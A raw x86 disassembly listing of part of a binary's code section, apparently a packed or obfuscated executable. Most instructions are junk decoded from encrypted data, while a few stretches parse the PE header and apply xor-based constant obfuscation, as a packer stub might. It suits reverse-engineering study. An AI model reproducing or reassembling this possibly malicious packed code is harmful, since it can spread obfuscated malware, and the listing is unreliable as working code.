  411274:	jmp    0x1fb36dd
  411279:	or     DWORD PTR ds:0x51c06b75,0x33
  411280:	and    ebp,edx
  411282:	pusha  
  411283:	xchg   edx,eax
  411284:	cmp    ebx,DWORD PTR ds:0x657301c7
  41128a:	lods   al,BYTE PTR ds:[esi]
  41128b:	dec    edi
  41128c:	sti    
  41128d:	sbb    DWORD PTR [edi+eax*4+0x557ae3c4],edx
  411294:	add    al,0x82
  411296:	mov    BYTE PTR [eax],ch
  411298:	cmp    DWORD PTR [ebp-0x78264cb3],0xf5795478
  4112a2:	xlat   BYTE PTR ds:[ebx]
  4112a3:	pop    esi
  4112a4:	fsub   QWORD PTR [edi]
  4112a6:	push   0x48
  4112a8:	sub    DWORD PTR [eax-0x7b],ebx
  4112ab:	pop    ebp
  4112ac:	jecxz  0x411249
  4112ae:	dec    edx
  4112af:	rol    ah,0xde
  4112b2:	daa    
  4112b3:	mov    esi,0x51de0f68
  4112b8:	cs inc ebp
  4112ba:	xchg   esi,eax
  4112bb:	jbe    0x4112b5
  4112bd:	addr16 inc eax
  4112bf:	inc    edi
  4112c0:	stos   BYTE PTR es:[edi],al
  4112c1:	sbb    ah,ah
  4112c3:	repz xor al,0x24
  4112c6:	daa    
  4112c7:	das    
  4112c8:	mov    ecx,esp
  4112ca:	adc    DWORD PTR [esi+eax*4+0x4780402a],edx
  4112d1:	adc    dh,ah
  4112d3:	push   esp
  4112d4:	jno    0x4112dd
  4112d6:	mov    eax,ebp
  4112d8:	or     eax,DWORD PTR [ebx-0x72]
  4112db:	in     al,dx
  4112dc:	cmp    al,ah
  4112de:	jle    0x41131e
  4112e0:	daa    
  4112e1:	daa    
  4112e2:	outs   dx,BYTE PTR ds:[esi]
  4112e3:	pusha  
  4112e4:	mov    ss,WORD PTR [ebx+0xb]
  4112e7:	je     0x4115eb
  4112ed:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4112f4:	lea    eax,[ebp-0x18]
  4112f7:	mov    DWORD PTR [ebp-0x14],eax
  4112fa:	mov    eax,DWORD PTR [ebp-0x14]
  4112fd:	add    DWORD PTR [eax],0x705fa8f
  411303:	mov    eax,DWORD PTR [ebp-0x10]
  411306:	jmp    0x4115d4
  41130b:	sub    al,0xc2
  41130d:	or     al,0xb3
  41130f:	lock jno 0x4112c3
  411312:	inc    ecx
  411313:	mov    ds:0x5868f61e,eax
  411318:	mov    dh,0xf3
  41131a:	mov    cl,0x49
  41131c:	inc    ebp
  41131d:	jle    0x41139d
  41131f:	scas   eax,DWORD PTR es:[edi]
  411320:	jl     0x4113a0
  411322:	jle    0x4112ac
  411324:	std    
  411325:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411326:	icebp  
  411327:	gs inc ebp
  411329:	repz mov ch,0x15
  41132c:	cmp    DWORD PTR [ebx+0x61db88dd],ebp
  411332:	mov    esi,0x49027db8
  411337:	sar    ebp,0x9f
  41133a:	inc    esi
  41133b:	xchg   ebp,eax
  41133c:	jne    0x4112d2
  41133e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41133f:	stos   DWORD PTR es:[edi],eax
  411340:	push   edx
  411341:	push   eax
  411342:	push   ss
  411343:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411344:	sub    edi,DWORD PTR [eax]
  411346:	addps  xmm1,xmm7
  411349:	neg    BYTE PTR [ebp-0x34]
  41134c:	fs gs mov ebx,0x18977b9
  411353:	lock xchg DWORD PTR [edi],esi
  411356:	pop    ds
  411357:	call   0x37c1a493
  41135c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41135d:	mov    bh,0x2d
  41135f:	call   esp
  411361:	or     al,BYTE PTR [ecx+0x48]
  411364:	aad    0xb6
  411366:	nop
  411367:	jne    0x41135e
  411369:	aaa    
  41136a:	mov    BYTE PTR [ecx-0x604d3ae0],0x1e
  411371:	dec    esi
  411372:	cmp    eax,0xd7f3f014
  411377:	xor    eax,0x8b83d1f2
  41137c:	or     dh,0xeb
  41137f:	out    dx,eax
  411380:	jp     0x4113c1
  411382:	fiadd  DWORD PTR ds:0x2e97b8ca
  411388:	adc    ah,cl
  41138a:	mov    ch,BYTE PTR [esi+0x7c]
  41138d:	push   edx
  41138e:	fwait
  41138f:	scas   al,BYTE PTR es:[edi]
  411390:	xlat   BYTE PTR ds:[ebx]
  411391:	pop    ebp
  411392:	push   es
  411393:	mov    al,ds:0xea848884
  411398:	push   edx
  411399:	cli    
  41139a:	fisubr DWORD PTR [edx-0x37]
  41139d:	repnz push edi
  41139f:	mov    ah,0xe
  4113a1:	sub    eax,0x4cb55956
  4113a6:	push   0x4a2718a3
  4113ab:	inc    bl
  4113ad:	imul   ebx,DWORD PTR [esi],0x7
  4113b0:	rol    bh,0x9
  4113b3:	dec    ebx
  4113b4:	xchg   esi,eax
  4113b5:	ficomp WORD PTR cs:[edi-0x32]
  4113b9:	and    ch,BYTE PTR [eax+0x21ae2e2d]
  4113bf:	ins    BYTE PTR es:[edi],dx
  4113c0:	mov    bh,0x4d
  4113c2:	or     eax,0x415c4cf5
  4113c7:	enter  0x7a68,0xf6
  4113cb:	jmp    DWORD PTR [edx*8-0x78c6797]
  4113d2:	cdq    
  4113d3:	arpl   WORD PTR [edx-0x65],sp
  4113d6:	dec    DWORD PTR [edi+edi*1+0xe]
  4113da:	repnz xor DWORD PTR [eax-0x58307cf4],0xd69c87eb
  4113e5:	pop    ecx
  4113e6:	sub    ebx,DWORD PTR [ebx-0x63cf2f52]
  4113ec:	add    eax,DWORD PTR [ecx+0x14]
  4113ef:	fist   DWORD PTR [edi-0x59]
  4113f2:	fcom   DWORD PTR [ebp+0x79c58e29]
  4113f8:	push   edi
  4113f9:	xor    al,0xd1
  4113fb:	sbb    eax,0x677afc4f
  411400:	iret   
  411401:	repnz test eax,0x78b708d1
  411407:	mov    ebx,eax
  411409:	loop   0x411458
  41140b:	repnz fcmove st,st(5)
  41140e:	mov    BYTE PTR [esp+ebp*1-0x6a],bh
  411412:	add    BYTE PTR [ebx+esi*2-0x41],cl
  411416:	mov    edi,0x15702a2a
  41141b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41141c:	inc    eax
  41141d:	test   BYTE PTR [esi-0x1f],ah
  411420:	sbb    esi,DWORD PTR [ecx+0x26340809]
  411426:	test   BYTE PTR [edi],0x9a
  411429:	sub    eax,0xe446e1bc
  41142e:	push   esi
  41142f:	test   BYTE PTR [edi],ah
  411431:	push   esp
  411432:	repnz leave 
  411434:	rcr    DWORD PTR [ecx+0x12],0x9b
  411438:	test   DWORD PTR [ebp-0x6c],0xe46f4fd7
  41143f:	or     bl,BYTE PTR [eax+0x32877e90]
  411445:	mov    dh,0xbe
  411447:	(bad)  
  411448:	add    esi,esi
  41144a:	mov    ah,0x1e
  41144c:	inc    eax
  41144d:	ss add dh,bl
  411450:	js     0x4114d0
  411452:	in     eax,dx
  411453:	sub    eax,0x8dcdb26a
  411458:	push   eax
  411459:	jne    0x4114d5
  41145b:	fisub  DWORD PTR [ebx+0xf]
  41145e:	or     DWORD PTR [ecx],ecx
  411460:	mov    ds,ecx
  411462:	jns    0x4113fc
  411464:	mov    esi,0x6f7e2d6
  411469:	jmp    0x411455
  41146b:	out    dx,eax
  41146c:	retf   0x3d27
  41146f:	clc    
  411470:	mov    esp,0x7a2378a3
  411475:	stc    
  411476:	cmp    eax,0xd5c0b588
  41147b:	or     dl,cl
  41147d:	inc    ecx
  41147e:	test   al,0xca
  411480:	sbb    eax,0x737845a1
  411485:	sub    BYTE PTR [eax],0xe7
  411488:	clc    
  411489:	(bad)  
  41148a:	mov    al,ds:0x8f892289
  41148f:	fstp   QWORD PTR [edi-0x90fc937]
  411495:	or     eax,0x9499aaac
  41149a:	cmp    al,0xac
  41149c:	mov    edx,0x2403ef9b
  4114a1:	out    dx,al
  4114a2:	sub    eax,0xd5f1a4fa
  4114a7:	or     eax,0x7d1f147d
  4114ac:	shr    BYTE PTR [edi+edi*1+0x6f],cl
  4114b0:	jnp    0x411483
  4114b2:	push   cs
  4114b3:	cwde   
  4114b4:	adc    BYTE PTR [ebx-0x7b1f791a],ch
  4114ba:	retf   
  4114bb:	int    0xfa
  4114bd:	fisttp DWORD PTR [ebp-0x21]
  4114c0:	xor    edx,ebx
  4114c2:	inc    esp
  4114c3:	push   cs
  4114c4:	mov    dh,0xf7
  4114c6:	xor    BYTE PTR [ebx-0x59],0xa5
  4114ca:	pop    edi
  4114cb:	fyl2xp1 
  4114cd:	iret   
  4114ce:	push   cs
  4114cf:	retf   
  4114d0:	fwait
  4114d1:	imul   esp,edx,0xf
  4114d4:	aam    0x94
  4114d6:	retf   0xbd2b
  4114d9:	pop    eax
  4114da:	mov    dl,0x38
  4114dc:	je     0x4114cc
  4114de:	int3   
  4114df:	dec    eax
  4114e0:	jnp    0x411486
  4114e2:	pop    edx
  4114e3:	fnstenv es:[ecx]
  4114e6:	dec    edi
  4114e7:	imul   ebx,DWORD PTR [edi],0xffffffd1
  4114ea:	cmp    ch,BYTE PTR [ecx]
  4114ec:	add    bh,BYTE PTR [esi+0x29766128]
  4114f2:	mov    edx,0x23289a92
  4114f7:	inc    eax
  4114f8:	push   ecx
  4114f9:	xchg   BYTE PTR [esi],bh
  4114fb:	push   0x2bf1fb72
  411500:	pop    edi
  411501:	aam    0xaf
  411503:	popf   
  411504:	(bad)  
  411505:	mov    bh,0xd1
  411507:	dec    ebx
  411508:	sub    ebx,DWORD PTR [esi+0x40]
  41150b:	sti    
  41150c:	test   eax,0xe07b2b31
  411511:	nop
  411512:	lods   al,BYTE PTR ds:[esi]
  411513:	mov    al,0xff
  411515:	fwait
  411516:	(bad)  
  411517:	jle    0x4114e7
  411519:	xchg   ebx,eax
  41151a:	imul   esp,edx,0xffffffdc
  41151d:	mov    ?,WORD PTR [ebp+0x2537ba1f]
  411523:	push   0x76298485
  411528:	call   0x99be:0x6dfb8291
  41152f:	retf   0x6699
  411532:	mov    ebx,0xe0111f22
  411537:	ins    DWORD PTR es:[edi],dx
  411538:	cdq    
  411539:	imul   edi,DWORD PTR [edx-0x1eb6a621],0x75
  411540:	scas   eax,DWORD PTR es:[edi]
  411541:	cli    
  411542:	sbb    eax,0x3e6fdc12
  411547:	(bad)  
  411548:	fsub   QWORD PTR [ebp-0x45]
  41154b:	loopne 0x411546
  41154d:	sahf   
  41154e:	repz cld 
  411550:	mov    al,ds:0xfec2846
  411555:	jbe    0x41159e
  411557:	fldcw  WORD PTR [edi+edx*2+0x482bda11]
  41155e:	mov    ah,0x9b
  411560:	jge    0x41156e
  411562:	and    BYTE PTR [ecx],dl
  411564:	mov    dl,0x33
  411566:	int3   
  411567:	aam    0x61
  411569:	hlt    
  41156a:	imul   ebx,DWORD PTR [edx],0xffffffb4
  41156d:	inc    ecx
  41156e:	jge    0x41153f
  411570:	ss mov dh,0x60
  411573:	push   es
  411574:	add    BYTE PTR [ecx],bh
  411576:	pop    es
  411577:	push   ebp
  411578:	jae    0x4115af
  41157a:	dec    edi
  41157b:	pop    ds
  41157c:	lock dec ebp
  41157e:	div    BYTE PTR [ebx]
  411580:	lahf   
  411581:	cmp    ah,bl
  411583:	pop    ebx
  411584:	jl     0x411562
  411586:	add    al,0xff
  411588:	mov    DWORD PTR [esi+ebp*1-0x3c],ecx
  41158c:	scas   eax,DWORD PTR es:[edi]
  41158d:	pop    es
  41158e:	mov    bh,0x78
  411590:	lock mov bl,0x3
  411593:	out    dx,al
  411594:	ins    DWORD PTR es:[edi],dx
  411595:	xchg   BYTE PTR [ebx-0x56],bh
  411598:	hlt    
  411599:	mov    WORD PTR [ecx],di
  41159c:	inc    edi
  41159d:	in     al,0xa3
  41159f:	pusha  
  4115a0:	dec    edx
  4115a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115a2:	scas   eax,DWORD PTR es:[edi]
  4115a3:	mov    al,ds:0x1d9b9513
  4115a8:	and    DWORD PTR [edx-0x37],ebp
  4115ab:	fidiv  WORD PTR [ecx-0x26]
  4115ae:	mov    dl,0x40
  4115b0:	cmp    DWORD PTR [ebp-0x135e4959],edi
  4115b6:	xchg   edi,eax
  4115b7:	add    al,0x71
  4115b9:	mov    al,0x97
  4115bb:	mov    edx,0xa5f8a2e2
  4115c0:	loop   0x4115cd
  4115c2:	push   eax
  4115c3:	pop    ecx
  4115c4:	popf   
  4115c5:	sar    DWORD PTR [ebx+0x298b6531],0x7e
  4115cc:	mov    esi,0x35c496d5
  4115d1:	jmp    0x3308:0x558b34b0
  4115d8:	ror    DWORD PTR [ebp+0x729b1084],0x32
  4115df:	add    BYTE PTR [ecx+0x45ff0845],cl
  4115e5:	or     al,0xe9
  4115e7:	sti    
  4115e8:	stc    
  4115e9:	(bad)  
  4115ea:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  4115f0:	mov    ecx,DWORD PTR [ebp+0x10]
  4115f3:	add    eax,esi
  4115f5:	mov    DWORD PTR [ecx],eax
  4115f7:	pop    esi
  4115f8:	leave  
  4115f9:	ret    0xc
  4115fc:	push   ebp
  4115fd:	mov    ebp,esp
  4115ff:	push   ecx
  411600:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411607:	jmp    0x4117ce
  41160c:	mov    eax,ds:0x7129745c
  411611:	xor    DWORD PTR [ecx+0x74],esp
  411614:	in     eax,0xeb
  411616:	leave  
  411617:	outs   dx,DWORD PTR ds:[esi]
  411618:	adc    eax,0x860dbd4a
  41161d:	inc    eax
  41161e:	jle    0x41169e
  411620:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411621:	jg     0x4116a1
  411623:	jle    0x411633
  411625:	xor    DWORD PTR [ebp+0x57288f41],esp
  41162b:	gs popf 
  41162d:	inc    edi
  41162e:	push   esp
  41162f:	inc    esp
  411630:	add    ecx,DWORD PTR [esi]
  411632:	hlt    
  411633:	sub    edi,DWORD PTR [ebx]
  411635:	test   BYTE PTR [edi-0x7dc9fcc6],ah
  41163b:	xor    dh,dl
  41163d:	add    ecx,ecx
  41163f:	rol    ebx,cl
  411641:	push   ebx
  411642:	inc    esp
  411643:	loope  0x411699
  411645:	xlat   BYTE PTR ds:[ebx]
  411646:	in     eax,dx
  411647:	sub    eax,0xd980ed15
  41164c:	jae    0x411600
  41164e:	das    
  41164f:	add    BYTE PTR [eax+0x1306d62],bh
  411655:	push   ds
  411656:	pop    ebx
  411657:	xor    eax,0x3481057f
  41165c:	shl    BYTE PTR [edx],1
  41165e:	repz and esi,DWORD PTR [esi+0x7d]
  411662:	push   edx
  411663:	aas    
  411664:	push   ds
  411665:	rcr    BYTE PTR [edi+0x4c],1
  411668:	aaa    
  411669:	in     al,dx
  41166a:	imul   ebp,edx,0x264a9e97
  411670:	sub    BYTE PTR [ebp+eax*4+0x52b1c38f],bl
  411677:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411678:	push   edx
  411679:	imul   eax,esp,0x50
  41167c:	bound  ebp,QWORD PTR [ecx]
  41167e:	mov    al,0x72
  411680:	fwait
  411681:	bound  ebp,QWORD PTR [ebx]
  411683:	lds    ebp,FWORD PTR [ebp+0x1935d954]
  411689:	sub    ecx,DWORD PTR [ebx]
  41168b:	mov    WORD PTR [ebp+0x1308e77d],gs
  411691:	(bad)  
  411692:	push   DWORD PTR [edx+eiz*1+0x4c]
  411696:	les    esp,FWORD PTR [edx-0x2a]
  411699:	xchg   edx,eax
  41169a:	test   eax,0x5263f699
  41169f:	outs   dx,DWORD PTR ds:[esi]
  4116a0:	repz clc 
  4116a2:	jae    0x411680
  4116a4:	xor    edi,esi
  4116a6:	mov    dh,0x4d
  4116a8:	test   BYTE PTR [esi-0x5bd7316b],0x7d
  4116af:	mov    ds:0x2f9daecf,al
  4116b4:	mov    bh,0x60
  4116b6:	jmp    0x411671
  4116b8:	(bad)  
  4116b9:	lock and eax,0xe438fd7e
  4116bf:	push   0xb44140ef
  4116c4:	cmp    eax,DWORD PTR [esi+0x683470d3]
  4116ca:	add    DWORD PTR [edx],eax
  4116cc:	lods   al,BYTE PTR ds:[esi]
  4116cd:	pop    ebx
  4116ce:	ins    DWORD PTR es:[edi],dx
  4116cf:	sub    DWORD PTR [ecx],0xf77ee649
  4116d5:	xchg   esi,eax
  4116d6:	stos   DWORD PTR es:[edi],eax
  4116d7:	adc    bh,BYTE PTR es:[ecx+ecx*8]
  4116db:	xor    al,0xbf
  4116dd:	adc    bl,bl
  4116df:	aad    0xa8
  4116e1:	sub    ebx,DWORD PTR [esi-0x3f]
  4116e4:	fmul   st(6),st
  4116e6:	or     edi,DWORD PTR [eax]
  4116e8:	lahf   
  4116e9:	scas   al,BYTE PTR es:[edi]
  4116ea:	cdq    
  4116eb:	in     al,0xea
  4116ed:	(bad)
  4116f1:	cli    
  4116f2:	(bad)  
  4116f3:	repnz sub al,0x85
  4116f6:	loope  0x411721
  4116f8:	lds    esp,FWORD PTR [ecx+ebx*2]
  4116fb:	stos   BYTE PTR es:[edi],al
  4116fc:	pop    ebx
  4116fd:	imul   edi,DWORD PTR [eax+0x64],0xd10349ac
  411704:	jno    0x41171f
  411706:	sbb    eax,0xaa909584
  41170b:	fwait
  41170c:	add    dh,ch
  41170e:	imul   edi,DWORD PTR [edi+0x39],0x5a297598
  411715:	xchg   edx,ecx
  411717:	pop    ecx
  411718:	popf   
  411719:	aas    
  41171a:	hlt    
  41171b:	pushf  
  41171c:	add    BYTE PTR [ebx+ebp*8+0x3e],0x25
  411721:	sbb    bl,BYTE PTR [ebx-0x7477022a]
  411727:	xchg   esp,eax
  411728:	pop    ebp
  411729:	iret   
  41172a:	jp     0x4116da
  41172c:	mov    ebp,0x2bff56d3
  411731:	out    0x17,al
  411733:	stc    
  411734:	pop    edi
  411735:	cmp    esp,DWORD PTR [edx]
  411737:	inc    ebp
  411738:	dec    edx
  411739:	inc    ecx
  41173a:	xadd   DWORD PTR [esp+edi*8+0x72],eax
  41173f:	out    dx,al
  411740:	stc    
  411741:	push   ecx
  411742:	adc    al,0x8b
  411744:	pop    esi
  411745:	scas   eax,DWORD PTR es:[edi]
  411746:	test   eax,0x249a1642
  41174b:	aaa    
  41174c:	lock cli 
  41174e:	ror    BYTE PTR [ebp+0x51090423],1
  411754:	sub    eax,DWORD PTR [ebx]
  411756:	sti    
  411757:	sbb    ebx,DWORD PTR [eax-0x6d]
  41175a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41175b:	leave  
  41175c:	push   ebx
  41175d:	(bad)  
  41175e:	fnstenv [ebp+0xe263259]
  411764:	sbb    eax,0x2d3d6f
  411769:	retf   0x4677
  41176c:	lea    ecx,[esi+ecx*4-0x420920fe]
  411773:	cmp    eax,0x18f8fd2e
  411778:	cmp    BYTE PTR [eax],dh
  41177a:	fcmovnbe st,st(6)
  41177c:	inc    eax
  41177d:	adc    al,0xdc
  41177f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411780:	mov    eax,ds:0x470447c4
  411785:	cli    
  411786:	cdq    
  411787:	mov    DWORD PTR [ebp+0x10],0xf56fb18f
  41178e:	pop    edi
  41178f:	fdivp  st(7),st
  411791:	rcr    BYTE PTR [edi+0x50],0x61
  411795:	(bad)  
  411797:	out    dx,al
  411798:	nop
  411799:	jns    0x411738
  41179b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41179c:	(bad)  
  41179d:	push   ebx
  41179e:	js     0x411758
  4117a0:	push   dx
  4117a2:	outs   dx,BYTE PTR ds:[esi]
  4117a3:	dec    edi
  4117a4:	pop    edx
  4117a5:	jmp    0xde5e:0xbf5dedb4
  4117ac:	sar    BYTE PTR [esi],cl
  4117ae:	push   esi
  4117af:	retf   0xd41f
  4117b2:	aad    0xb7
  4117b4:	adc    eax,0x72091d86
  4117b9:	lea    esp,[edx-0x475869b9]
  4117bf:	call   0xc6e6:0x6f7b9240
  4117c6:	add    al,0x22
  4117c8:	push   esi
  4117c9:	mov    ch,dh
  4117cb:	in     al,dx
  4117cc:	sub    DWORD PTR [ebp-0x75],0x5c70845
  4117d3:	mov    ds:0x3d004337,eax
  4117d8:	inc    edx
  4117d9:	add    BYTE PTR [eax],al
  4117db:	mov    al,BYTE PTR [eax]
  4117dd:	sub    DWORD PTR ds:0x4336ff,0x6d7d
  4117e7:	add    al,0x38
  4117e9:	xor    DWORD PTR ds:0x43379f,0x433703
  4117f3:	xor    al,0x46
  4117f5:	mov    DWORD PTR ds:0x43379f,0x735a
  4117ff:	cmp    al,0xc3
  411801:	jne    0x411aa4
  411807:	and    edx,0x7ba3
  41180d:	mov    eax,DWORD PTR [ebp+0x8]
  411810:	mov    ecx,DWORD PTR [ebp+0x8]
  411813:	add    ecx,DWORD PTR [eax+0x3c]
  411816:	and    DWORD PTR ds:0x43371b,0x4b8b
  411820:	mov    edx,0x7510854
  411825:	and    DWORD PTR ds:0x4337ab,0x0
  41182f:	mov    eax,ds:0x4337ab
  411834:	inc    eax
  411835:	mov    ds:0x4337ab,eax
  41183a:	cmp    DWORD PTR ds:0x4337ab,0xb
  411841:	jne    0x411887
  411847:	push   0x4338bc
  41184c:	push   0x761c
  411851:	push   0x2832
  411856:	push   0x3f0d
  41185b:	push   0x4923
  411860:	push   DWORD PTR [ebp-0x24]
  411863:	push   DWORD PTR [ebp-0x28]
  411866:	push   DWORD PTR [ebp-0xc]
  411869:	push   0x49e1
  41186e:	push   DWORD PTR [ebp-0x28]
  411871:	push   DWORD PTR [ebp-0x14]
  411874:	push   DWORD PTR [ebp-0x10]
  411877:	push   0x6b07
  41187c:	push   0x8d34
  411881:	call   DWORD PTR ds:0x4122b8
  411887:	cmp    DWORD PTR ds:0x4337ab,0xa
  41188e:	jne    0x41189f
  411894:	mov    eax,ds:0x4337ab
  411899:	inc    eax
  41189a:	mov    ds:0x4337ab,eax
  41189f:	cmp    DWORD PTR ds:0x4337ab,0x11
  4118a6:	jb     0x41182f
  4118ac:	mov    DWORD PTR [ebp+0x8],ecx
  4118af:	mov    eax,DWORD PTR [ebp-0x4]
  4118b2:	xor    eax,edx
  4118b4:	push   esi
  4118b5:	mov    esi,DWORD PTR [ebp+0x8]
  4118b8:	mov    ecx,0x32729b
  4118bd:	add    eax,ecx
  4118bf:	cmp    DWORD PTR [esi+0x54],eax
  4118c2:	pop    esi
  4118c3:	je     0x4118d1
  4118c9:	mov    eax,DWORD PTR [ebp+0x8]
  4118cc:	jmp    0x411ab1
  4118d1:	mov    eax,DWORD PTR [ebp-0x4]
  4118d4:	xor    eax,edx
  4118d6:	jmp    0x411a9d
  4118db:	mov    ebp,0xe1e4219a
  4118e0:	gs mov ecx,0x58658ca3
  4118e6:	stos   DWORD PTR es:[edi],eax
  4118e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118e8:	mov    ds:0x4e2c6ab1,eax
  4118ed:	jle    0x41196d
  4118ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118f0:	jg     0x411970
  4118f2:	jle    0x411920
  4118f4:	mov    dh,0xbc
  4118f6:	push   eax
  4118f7:	es pop edi
  4118f9:	mov    BYTE PTR [edx-0x24b31742],bh
  4118ff:	or     cl,BYTE PTR [edi+0x34]
  411902:	mov    esp,0xecf33081
  411907:	sbb    eax,0xeb5da04b
  41190c:	mov    esi,0xaa459d
  411911:	or     BYTE PTR [edi-0x63],bh
  411914:	shl    BYTE PTR [esi-0x76a71690],cl
  41191a:	lock dec ebp
  41191c:	jno    0x41190b
  41191e:	ja     0x4118df
  411920:	fimul  DWORD PTR ds:0x8cf063ce
  411926:	imul   edx,DWORD PTR [esi-0x35d220cd],0xc2e3065b
  411930:	xchg   esi,eax
  411931:	imul   eax,DWORD PTR [edx+ecx*8],0x55
  411935:	(bad)  [esi+0x1a033528]
  41193b:	adc    ah,0x2
  41193e:	scas   al,BYTE PTR es:[edi]
  41193f:	jmp    0x3bd55ed
  411944:	retf   0xacc9
  411947:	aam    0x97
  411949:	pop    ebx
  41194a:	jnp    0x411923
  41194c:	(bad)  
  41194d:	xlat   BYTE PTR ds:[ebx]
  41194e:	mov    edx,0x456d389b
  411953:	pop    esi
  411954:	push   0x5686ce55
  411959:	sub    eax,0x28907ccb
  41195e:	jnp    0x4118ec
  411960:	adc    al,0xd3
  411962:	popf   
  411963:	jmp    0x5271fec8
  411968:	xor    BYTE PTR [edx],ch
  41196a:	mov    ?,WORD PTR [ecx]
  41196c:	pop    ecx
  41196d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41196e:	in     eax,dx
  41196f:	rcl    DWORD PTR [edx],cl
  411971:	and    edx,edx
  411973:	inc    ebp
  411974:	js     0x411972
  411976:	fidivr DWORD PTR [edi]
  411978:	fidiv  DWORD PTR [esi-0x50f74c5b]
  41197e:	ins    DWORD PTR es:[edi],dx
  41197f:	shl    DWORD PTR [edi+0xc],0x13
  411983:	imul   ebx,DWORD PTR [ebx],0x1f
  411986:	xor    dl,BYTE PTR fs:[eax-0xd]
  41198a:	gs dec esp
  41198c:	test   eax,0xb48c2dd4
  411991:	sahf   
  411992:	and    al,0x70
  411994:	pop    edi
  411995:	mov    eax,0x6f417d65
  41199a:	xor    ch,BYTE PTR [edi]
  41199c:	dec    esp
  41199d:	icebp  
  41199e:	retf   0x57ee
  4119a1:	or     eax,0xca812ac8
  4119a6:	add    al,0x44
  4119a8:	dec    edx
  4119a9:	outs   dx,DWORD PTR ds:[esi]
  4119aa:	xchg   ebx,eax
  4119ab:	fimul  DWORD PTR [ebx+0x59]
  4119ae:	(bad)  
  4119af:	in     eax,0x96
  4119b1:	inc    ebx
  4119b2:	scas   eax,DWORD PTR es:[edi]
  4119b3:	mov    bh,0x3b
  4119b5:	data16 mov ds:0x5b5fd2b1,al
  4119bb:	(bad)  
  4119bc:	mov    ss,WORD PTR [edi]
  4119be:	mov    eax,0xee23fb1
  4119c3:	dec    edi
  4119c4:	adc    eax,0xc5557dc7
  4119c9:	jnp    0x41195f
  4119cb:	std    
  4119cc:	nop
  4119cd:	cmp    al,0x99
  4119cf:	(bad)  
  4119d0:	out    dx,eax
  4119d1:	pop    ss
  4119d2:	or     al,0x56
  4119d4:	mov    ebp,0xdd0f24d7
  4119d9:	mov    ds:0x1f265fa4,al
  4119de:	push   ss
  4119df:	loop   0x411a39
  4119e1:	or     BYTE PTR [ebx-0x4a],dl
  4119e4:	bound  edx,QWORD PTR [ebx-0x18]
  4119e7:	das    
  4119e8:	mov    BYTE PTR [edx+0x674513fc],ch
  4119ee:	xchg   ebp,eax
  4119ef:	jl     0x411a2d
  4119f1:	push   0xffffffe9
  4119f3:	add    eax,0xb0d8ee7a
  4119f8:	push   edi
  4119f9:	push   cs
  4119fa:	jae    0x4119c8
  4119fc:	cmp    BYTE PTR [ecx+edx*8],cl
  4119ff:	sahf   
  411a00:	ins    BYTE PTR es:[edi],dx
  411a01:	aam    0xd7
  411a03:	add    bl,BYTE PTR [ebp-0x3b]
  411a06:	daa    
  411a07:	and    BYTE PTR [eax-0x5a],ah
  411a0a:	shr    BYTE PTR [ebp-0x77],cl
  411a0d:	add    eax,0x8e0079e6
  411a12:	mov    esi,0x4863b3be
  411a17:	cmp    BYTE PTR [eax+0x748f3df5],ch
  411a1d:	jns    0x411a82
  411a1f:	mov    ecx,fs
  411a21:	cmp    BYTE PTR [edx+0x1b],cl
  411a24:	xchg   DWORD PTR [edx+0x56c26ecc],ecx
  411a2a:	pusha  
  411a2b:	adc    DWORD PTR [ebx+0x364ac9dc],0xba0b7de8
  411a35:	push   ss
  411a36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a37:	cmp    al,0x8c
  411a39:	add    esi,DWORD PTR [ebx+0x7a788f15]
  411a3f:	cdq    
  411a40:	and    DWORD PTR [ebx+0x43],edi
  411a43:	mov    esp,0x946f0a1f
  411a48:	mov    esp,0xbc510be9
  411a4d:	push   ebx
  411a4e:	fs into 
  411a50:	repnz inc ecx
  411a52:	sbb    esp,DWORD PTR [edx+0x5dce71de]
  411a58:	push   edx
  411a59:	out    0x28,al
  411a5b:	adc    eax,0x3afa48c6
  411a60:	pop    edx
  411a61:	mov    dl,0xa7
  411a63:	sub    ebp,DWORD PTR [eax+0x64]
  411a66:	pop    esi
  411a67:	inc    esp
  411a68:	js     0x411a92
  411a6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a6b:	add    al,0xe8
  411a6d:	cmp    BYTE PTR [edx],ah
  411a6f:	cli    
  411a70:	dec    esi
  411a71:	sub    dl,BYTE PTR [ebp-0x6d]
  411a74:	lds    eax,FWORD PTR [eax]
  411a76:	sub    DWORD PTR [edi+ecx*4+0x67440ba9],0x663200db
  411a81:	clc    
  411a82:	es aad 0xe9
  411a85:	ja     0x411a78
  411a87:	(bad)  
  411a88:	or     DWORD PTR [esi+0x27],ebx
  411a8b:	or     ebp,esp
  411a8d:	popf   
  411a8e:	in     eax,0x85
  411a90:	daa    
  411a91:	lea    ebx,[esi+eax*1]
  411a94:	xchg   esi,eax
  411a95:	pop    ebx
  411a96:	loopne 0x411ad2
  411a98:	(bad)  
  411a99:	cld    
  411a9a:	iret   
  411a9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a9c:	loope  0x411aa1
  411a9e:	shr    ecx,0xd
  411aa1:	add    BYTE PTR [eax],al
  411aa3:	add    BYTE PTR [ebx+0x5435fc45],cl
  411aa9:	or     BYTE PTR [ecx+0x7],dl
  411aac:	add    eax,0x32729b
  411ab1:	leave  
  411ab2:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    al,0x29
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    DWORD PTR ss:[ecx],eax
  412007:	add    BYTE PTR [eax+0x29],al
